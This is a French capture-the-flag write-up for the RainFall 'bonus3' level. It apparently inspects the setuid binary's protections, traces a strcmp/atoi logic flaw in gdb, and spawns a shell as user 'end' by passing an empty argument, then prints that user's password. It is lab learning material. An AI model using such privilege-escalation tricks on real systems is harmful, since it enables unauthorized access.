# BONUS 3

### Reconnaissance

On se connecte au level9 avec le password : 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

Nous trouvons un binaire:
```
bonus3@192.168.56.102's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/bonus3/bonus3
bonus3@RainFall:~$ ls
bonus3
bonus3@RainFall:~$ file bonus3 
bonus3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x530d693450de037e44d1186904401c8f8064874b, not stripped
```

La première chose qu'on peux remarqué c'est le `NX enabled`, la pile n'est pas exécutable... <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a> ?

On peux regardé aussi de cette manière:
```
bonus3@RainFall:~$ readelf -a bonus3 |grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
```
Read, Write mais pas Exécutable.

En analysant le code source on peux remarqué l'appel a `strcmp` et en fonction de sa valeur de retour, fait un appel avec `execl`:
```
│       │   0x080485da      e8d1fdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│       │   0x080485df      85c0           test eax, eax
│      ┌──< 0x080485e1      751e           jne 0x8048601
│      ││   0x080485e3      c74424080000.  mov dword [nmemb], 0
│      ││   0x080485eb      c74424040787.  mov dword [size], 0x8048707 ; [0x8048707:4]=0x2f006873
│      ││   0x080485f3      c704240a8704.  mov dword [esp], str.bin_sh ; [0x804870a:4]=0x6e69622f ; "/bin/sh"
│      ││   0x080485fa      e821feffff     call sym.imp.execl
│     ┌───< 0x080485ff      eb0f           jmp 0x8048610
│     │││   ; CODE XREF from main @ 0x80485e1
│     │└──> 0x08048601      8d442418       lea eax, dword [ptr]
│     │ │   0x08048605      83c042         add eax, 0x42               ; 66
│     │ │   0x08048608      890424         mov dword [esp], eax        ; const char *s
│     │ │   0x0804860b      e8d0fdffff     call sym.imp.puts           ; int puts(const char *s)
│     │ │   ; CODE XREF from main @ 0x80485ff
│     └───> 0x08048610      b800000000     mov eax, 0
│       │   ; CODE XREF from main @ 0x8048548
│       └─> 0x08048615      8d65f8         lea esp, dword [var_8h]
│           0x08048618      5b             pop ebx
│           0x08048619      5f             pop edi
│           0x0804861a      5d             pop ebp
└           0x0804861b      c3             ret
```

Si on regarde les arguments
(Au préalable j'ai creer un fichier /home/user/end/.pass avec PASSWORD a l'intérieur)
```
gdb-peda$ b*0x080485da
Breakpoint 1 at 0x80485da
gdb-peda$ r 1
Starting program: /home/yoginet/Documents/101/rainfall/bonus3/bonus3 1
[...]
   0x80485cf <main+219>:        mov    DWORD PTR [esp+0x4],eax
   0x80485d3 <main+223>:        lea    eax,[esp+0x18]
   0x80485d7 <main+227>:        mov    DWORD PTR [esp],eax
=> 0x80485da <main+230>:        call   0x80483b0 <strcmp@plt>
   0x80485df <main+235>:        test   eax,eax
   0x80485e1 <main+237>:        jne    0x8048601 <main+269>
   0x80485e3 <main+239>:        mov    DWORD PTR [esp+0x8],0x0
   0x80485eb <main+247>:        mov    DWORD PTR [esp+0x4],0x8048707
Guessed arguments:
arg[0]: 0xffffd138 --> 0x53530050 ('P')
arg[1]: 0xffffd444 --> 0x48530031 ('1')
[...]

gdb-peda$ r 9
Starting program: /home/yoginet/Documents/101/rainfall/bonus3/bonus3 9
[...]
   0x80485cf <main+219>:        mov    DWORD PTR [esp+0x4],eax
   0x80485d3 <main+223>:        lea    eax,[esp+0x18]
   0x80485d7 <main+227>:        mov    DWORD PTR [esp],eax
=> 0x80485da <main+230>:        call   0x80483b0 <strcmp@plt>
   0x80485df <main+235>:        test   eax,eax
   0x80485e1 <main+237>:        jne    0x8048601 <main+269>
   0x80485e3 <main+239>:        mov    DWORD PTR [esp+0x8],0x0
   0x80485eb <main+247>:        mov    DWORD PTR [esp+0x4],0x8048707
Guessed arguments:
arg[0]: 0xffffd138 ("PASSWORD\n")
arg[1]: 0xffffd444 --> 0x48530039 ('9')
[...]
```

On remarque que la valeur de notre argument est la longueur de l'element arg[0] qu'il compare.

L'exploitation sera donc très simple.

### Exploitation

Que ce passe ton si on envoie 0 ?
```
gdb-peda$ r 0
Starting program: /home/yoginet/Documents/101/rainfall/bonus3/bonus3 0
[----------------------------------registers-----------------------------------]
EAX: 0xffffd138 --> 0x53534100 ('')
EBX: 0xffffd138 --> 0x53534100 ('')
ECX: 0x804a010 --> 0x0 
EDX: 0x13 
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xffffd1bc --> 0x804a1a0 --> 0x0 
EBP: 0xffffd1c8 --> 0x0 
ESP: 0xffffd120 --> 0xffffd138 --> 0x53534100 ('')
EIP: 0x80485da (<main+230>:     call   0x80483b0 <strcmp@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485cf <main+219>:        mov    DWORD PTR [esp+0x4],eax
   0x80485d3 <main+223>:        lea    eax,[esp+0x18]
   0x80485d7 <main+227>:        mov    DWORD PTR [esp],eax
=> 0x80485da <main+230>:        call   0x80483b0 <strcmp@plt>
   0x80485df <main+235>:        test   eax,eax
   0x80485e1 <main+237>:        jne    0x8048601 <main+269>
   0x80485e3 <main+239>:        mov    DWORD PTR [esp+0x8],0x0
   0x80485eb <main+247>:        mov    DWORD PTR [esp+0x4],0x8048707
Guessed arguments:
arg[0]: 0xffffd138 --> 0x53534100 ('')
arg[1]: 0xffffd444 --> 0x48530030 ('0')
```

Et si on envoie rien ?
```
gdb-peda$ r ""
Starting program: /home/yoginet/Documents/101/rainfall/bonus3/bonus3 ""
[----------------------------------registers-----------------------------------]
EAX: 0xffffd138 --> 0x53534100 ('')
EBX: 0xffffd138 --> 0x53534100 ('')
ECX: 0x804a010 --> 0x0 
EDX: 0x13 
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xffffd1bc --> 0x804a1a0 --> 0x0 
EBP: 0xffffd1c8 --> 0x0 
ESP: 0xffffd120 --> 0xffffd138 --> 0x53534100 ('')
EIP: 0x80485da (<main+230>:     call   0x80483b0 <strcmp@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485cf <main+219>:        mov    DWORD PTR [esp+0x4],eax
   0x80485d3 <main+223>:        lea    eax,[esp+0x18]
   0x80485d7 <main+227>:        mov    DWORD PTR [esp],eax
=> 0x80485da <main+230>:        call   0x80483b0 <strcmp@plt>
   0x80485df <main+235>:        test   eax,eax
   0x80485e1 <main+237>:        jne    0x8048601 <main+269>
   0x80485e3 <main+239>:        mov    DWORD PTR [esp+0x8],0x0
   0x80485eb <main+247>:        mov    DWORD PTR [esp+0x4],0x8048707
Guessed arguments:
arg[0]: 0xffffd138 --> 0x53534100 ('')
arg[1]: 0xffffd445 --> 0x45485300 ('')
[...]
Breakpoint 1, 0x080485da in main ()
gdb-peda$ c
Continuing.
process 26251 is executing new program: /usr/bin/dash
```

Parfait, on lance donc notre commande sur notre vm:
```
bonus3@RainFall:~$ ./bonus3 ""
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ whoami
end
$ id
uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
```

Enjoy :)
